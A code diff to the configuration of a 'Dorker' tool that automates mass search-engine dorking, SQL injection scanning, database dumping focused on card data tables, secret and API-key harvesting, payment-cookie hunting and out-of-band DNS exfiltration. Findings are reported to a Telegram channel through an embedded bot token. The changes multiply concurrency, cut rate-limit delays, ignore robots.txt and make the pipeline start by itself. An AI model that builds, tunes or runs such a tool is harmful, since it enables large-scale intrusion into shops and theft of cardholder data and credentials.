@@ -15,19 +15,20 @@ class DorkerConfig:
     
     # =============== TELEGRAM ===============
     telegram_bot_token: str = os.getenv("DORKER_BOT_TOKEN", "8187477232:AAEh3X22b1ddY9ZaVxc0x-j9MZQyTK9Wbp4")
-    telegram_chat_id: str = os.getenv("DORKER_CHAT_ID", "")
+    telegram_chat_id: str = os.getenv("DORKER_CHAT_ID", "-1003720958643")
     telegram_group_id: str = os.getenv("DORKER_GROUP_ID", "-1003720958643")  # Channel for ALL findings
     
     # =============== DORK GENERATOR ===============
     params_dir: str = os.path.join(os.path.dirname(__file__), "params")
-    max_dorks: int = 15000
-    max_per_pattern: int = 200
+    custom_dork_file: str = os.path.join(os.path.dirname(__file__), "params", "custom_dorks.txt")
+    max_dorks: int = 1000000
+    max_per_pattern: int = 800
     dork_shuffle: bool = True
     
     # =============== SEARCH ENGINE ===============
-    search_delay_min: int = 6
-    search_delay_max: int = 15
-    results_per_dork: int = 20
+    search_delay_min: int = 3
+    search_delay_max: int = 8
+    results_per_dork: int = 50
     engines: List[str] = field(default_factory=lambda: [
         "duckduckgo", "bing", "startpage", "yahoo",
         "ecosia", "qwant", "brave", "aol",
@@ -59,10 +60,10 @@ class DorkerConfig:
     # =============== FIRECRAWL ===============
     firecrawl_api_key: str = os.getenv("FIRECRAWL_API_KEY", "")
     firecrawl_enabled: bool = True
-    firecrawl_search_limit: int = 20          # Results per search query
+    firecrawl_search_limit: int = 80          # Results per search query
     firecrawl_scrape_enabled: bool = True     # Use FC to scrape target pages
     firecrawl_crawl_enabled: bool = True      # Use FC for /scan domain crawls
-    firecrawl_crawl_limit: int = 100          # Max pages per crawl
+    firecrawl_crawl_limit: int = 400          # Max pages per crawl
     firecrawl_as_fallback: bool = False       # If True, only use when other engines fail
     firecrawl_scrape_formats: List[str] = field(default_factory=lambda: [
         "markdown", "html", "links"
@@ -73,8 +74,8 @@ class DorkerConfig:
     # =============== HEADLESS BROWSER (search resilience) ===============
     browser_enabled: bool = True              # Enable Playwright headless browser fallback
     browser_headless: bool = True             # Run headless (no visible window)
-    browser_max_concurrent: int = 3           # Max concurrent browser tabs
-    browser_page_timeout: int = 30000         # Nav timeout per page (ms)
+    browser_max_concurrent: int = 32           # Max concurrent browser tabs
+    browser_page_timeout: int = 25000         # Nav timeout per page (ms)
     browser_engines: List[str] = field(default_factory=lambda: [
         "google", "bing", "duckduckgo", "startpage",
     ])  # Engines to try in headless mode (ordered)
@@ -98,17 +99,17 @@ class DorkerConfig:
     waf_skip_extreme: bool = True  # Skip targets with extreme protection
     waf_skip_high: bool = False
     waf_timeout: int = 10
-    waf_max_concurrent: int = 20
+    waf_max_concurrent: int = 200
     
     # =============== SECRET EXTRACTION ===============
     secret_extraction_enabled: bool = True
     secret_timeout: int = 10
-    secret_max_concurrent: int = 20
+    secret_max_concurrent: int = 200
     
     # =============== SQL INJECTION SCANNER ===============
     sqli_enabled: bool = True
     sqli_timeout: int = 15
-    sqli_max_concurrent: int = 10
+    sqli_max_concurrent: int = 100
     sqli_delay: int = 5  # For time-based injection
     sqli_techniques: List[str] = field(default_factory=lambda: [
         "error", "union", "boolean", "time"
@@ -119,7 +120,7 @@ class DorkerConfig:
     
     # =============== DATA DUMPER ===============
     dumper_enabled: bool = True
-    dumper_max_rows: int = 500
+    dumper_max_rows: int = 1000
     dumper_timeout: int = 20
     dumper_output_dir: str = os.path.join(os.path.dirname(__file__), "dumps")
     dumper_targeted: bool = True  # Focus on card data tables
@@ -134,18 +135,18 @@ class DorkerConfig:
     
     # =============== DEEP CRAWLER (v3.9 — Recursive BFS) ===============
     deep_crawl_enabled: bool = True
-    deep_crawl_max_pages: int = 50          # Max pages per domain (full scan; pipeline uses quick_crawl)
-    deep_crawl_max_depth: int = 3           # Max BFS depth (0=seed only, 3=3 clicks deep)
+    deep_crawl_max_pages: int = 400         # Max pages per domain (full scan; pipeline uses quick_crawl)
+    deep_crawl_max_depth: int = 5           # Max BFS depth (0=seed only, 3=3 clicks deep)
     deep_crawl_timeout: int = 10            # Timeout per page fetch (seconds)
-    deep_crawl_concurrent: int = 10         # Max concurrent page fetches
-    deep_crawl_delay: float = 0.1           # Delay between fetches (rate limit)
+    deep_crawl_concurrent: int = 100         # Max concurrent page fetches
+    deep_crawl_delay: float = 0.01          # Delay between fetches (rate limit)
     deep_crawl_robots: bool = False         # Respect robots.txt Disallow rules
-    deep_crawl_sqli_limit: int = 15          # Max crawler-discovered param URLs to SQLi-test in pipeline
+    deep_crawl_sqli_limit: int = 120          # Max crawler-discovered param URLs to SQLi-test in pipeline
     
     # =============== PORT SCANNER (v3.10) ===============
     port_scan_enabled: bool = True
     port_scan_timeout: float = 2.0          # Timeout per port probe (seconds)
-    port_scan_concurrent: int = 50          # Max concurrent port probes
+    port_scan_concurrent: int = 600         # Max concurrent port probes
     port_scan_banner_timeout: float = 3.0   # Timeout for banner grabbing
     port_scan_banners: bool = True          # Enable banner grabbing
     port_scan_ports: str = "quick"          # "quick" (31 ports), "extended" (~80), or comma-separated
@@ -156,19 +157,19 @@ class DorkerConfig:
     oob_callback_port: int = 0              # 0 = ephemeral random port
     oob_callback_timeout: float = 15.0      # Seconds to wait for callback
     oob_use_interactsh: bool = True         # Use interact.sh for DNS exfil
-    oob_max_extractions: int = 5            # Max data items to extract per target
+    oob_max_extractions: int = 10            # Max data items to extract per target
     
     # =============== MULTI-DBMS UNION DUMPER (v3.12) ===============
     union_dump_enabled: bool = True
-    union_dump_max_tables: int = 30         # Max tables to dump per target
-    union_dump_max_rows: int = 500          # Max rows per table
+    union_dump_max_tables: int = 60         # Max tables to dump per target
+    union_dump_max_rows: int = 1000          # Max rows per table
     union_dump_timeout: float = 15.0        # Timeout per request
-    union_dump_max_columns_per_table: int = 30
+    union_dump_max_columns_per_table: int = 60
     
     # =============== API KEY VALIDATION (v3.13) ===============
     key_validation_enabled: bool = True
     key_validation_timeout: float = 10.0    # Timeout per API validation call
-    key_validation_concurrent: int = 5      # Max concurrent validations
+    key_validation_concurrent: int = 60     # Max concurrent validations
     key_validation_report_dead: bool = False # Also report dead keys
     
     # =============== ML FALSE POSITIVE FILTER (v3.14) ===============
@@ -179,8 +180,8 @@ class DorkerConfig:
     ml_filter_auto_train: bool = True       # Auto-train when enough data
     
     # =============== REPORTER ===============
-    reporter_rate_limit: float = 1.0  # Min seconds between messages
-    reporter_batch_size: int = 5
+    reporter_rate_limit: float = 0.25  # Min seconds between messages
+    reporter_batch_size: int = 20
     reporter_status_interval: int = 3600  # Status update every N seconds
     report_gateways: bool = True
     report_cards: bool = True
@@ -207,8 +208,9 @@ class DorkerConfig:
     
     # =============== DAEMON MODE ===============
     continuous: bool = True
-    cycle_delay: int = 60  # Seconds between dork cycles
+    cycle_delay: int = 15  # Seconds between dork cycles
     max_cycles: int = 0  # 0 = infinite
+    auto_start_pipeline: bool = True  # Auto-start dorking on bot startup (no /dorkon needed)
     
     # =============== STORAGE ===============
     found_sites_file: str = os.path.join(os.path.dirname(__file__), "found_sites.json")
@@ -219,11 +221,11 @@ class DorkerConfig:
     use_sqlite: bool = True  # Use SQLite instead of JSON files
     
     # =============== SEARCH PAGINATION ===============
-    search_max_pages: int = 3  # Search pages 1-3 per engine per dork
+    search_max_pages: int = 15  # Search pages 1-5 per engine per dork
     engine_health_cooldown: int = 300  # Seconds to cool down a failing engine
     
     # =============== CONCURRENT PROCESSING ===============
-    concurrent_url_limit: int = 15  # Max URLs processed in parallel
+    concurrent_url_limit: int = 160  # Max URLs processed in parallel
     
     # =============== CIRCUIT BREAKER ===============
     circuit_breaker_threshold: int = 3  # Failures before blocking domain
@@ -258,13 +260,13 @@ class DorkerConfig:
     # =============== COOKIE HUNTER (v3.5) ===============
     cookie_hunter_enabled: bool = True       # Active B3 + gateway cookie hunting
     cookie_hunt_probe_checkout: bool = True   # Probe /checkout, /cart, /payment paths
-    cookie_hunt_max_probes: int = 8           # Max checkout pages to probe per domain
+    cookie_hunt_max_probes: int = 50          # Max checkout pages to probe per domain
     cookie_hunt_report_commerce: bool = True  # Also report generic commerce cookies
     cookie_hunt_report_html_gateways: bool = True  # Report gateway SDK detections in HTML
     
     # =============== E-COMMERCE CHECKER (v3.8) ===============
     ecom_checker_enabled: bool = True        # Enable Shopify/WooCommerce/Magento/PrestaShop/OpenCart checks
-    ecom_max_probes: int = 15                # Max endpoint probes per platform per domain
+    ecom_max_probes: int = 80                # Max endpoint probes per platform per domain
     ecom_probe_timeout: int = 10             # Timeout per probe request (seconds)
     ecom_platforms: List[str] = field(default_factory=lambda: [
         "shopify", "woocommerce", "magento", "prestashop", "opencart",
@@ -320,7 +322,7 @@ class DorkerConfig:
     
     # =============== VALIDATION ===============
     validation_timeout: int = 15
-    max_concurrent_validations: int = 10
+    max_concurrent_validations: int = 120
     min_content_length: int = 500  # Skip pages with less content
     
     # =============== PRIORITY CATEGORIES =============== 
